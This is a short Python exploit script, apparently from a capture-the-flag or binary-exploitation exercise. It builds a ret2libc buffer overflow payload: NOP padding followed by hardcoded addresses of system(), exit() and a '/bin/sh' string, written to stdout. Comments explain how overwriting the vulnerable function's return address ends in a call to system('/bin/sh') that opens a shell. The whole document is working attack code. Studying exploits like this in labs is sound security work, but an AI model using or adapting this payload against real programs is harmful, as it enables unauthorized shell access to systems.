import sys
import struct

padding = b'\x90'*22
#address of system()
system = struct.pack("<I", 0x08050f80)
#address of /bin/sh in libc
shellAddress = struct.pack("<I", 0x080b2851)
#address of exit function
returnAddress = struct.pack("<I", 0x08050340)
#we use padding to get to the return address of the 
#vulnerable function, that address is replaced with
#system(), the address after that is where the
#function will exit(), then we add function arguments
#after that for system so in the end we call 
#system("/bin/sh") 
payload = padding+system+returnAddress+shellAddress
sys.stdout.buffer.write(payload)
